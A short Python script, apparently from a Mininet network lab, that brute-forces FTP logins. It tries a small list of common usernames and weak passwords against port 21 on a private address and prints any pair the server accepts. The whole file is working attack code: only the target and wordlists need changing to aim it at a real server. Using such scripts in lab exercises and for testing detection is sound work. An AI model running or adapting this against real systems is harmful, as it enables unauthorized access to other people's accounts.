#!/usr/bin/env python3
# Attack 2: FTP Brute Force
# Run from: internet or ws2
# Usage: python3 ftp_bruteforce.py

import socket
import time

TARGET = "10.12.0.40"
PORT = 21

# Small wordlist for demo
USERS = ["admin", "root", "ftp", "user", "mininet"]
PASSWORDS = ["123456", "password", "admin", "root", "mininet", "ftp", "toor"]

def try_login(user, password):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((TARGET, PORT))
        s.recv(1024)  # banner
        
        s.send(f"USER {user}\r\n".encode())
        s.recv(1024)
        
        s.send(f"PASS {password}\r\n".encode())
        response = s.recv(1024).decode()
        s.close()
        
        if "230" in response:  # 230 = Login successful
            return True
        return False
    except:
        return False

if __name__ == "__main__":
    print(f"[*] Starting FTP brute force on {TARGET}:{PORT}")
    attempts = 0
    
    for user in USERS:
        for password in PASSWORDS:
            attempts += 1
            print(f"[*] Trying {user}:{password}")
            if try_login(user, password):
                print(f"[+] SUCCESS! {user}:{password}")
                exit(0)
            time.sleep(0.5)
    
    print(f"\n[-] No valid credentials found after {attempts} attempts")
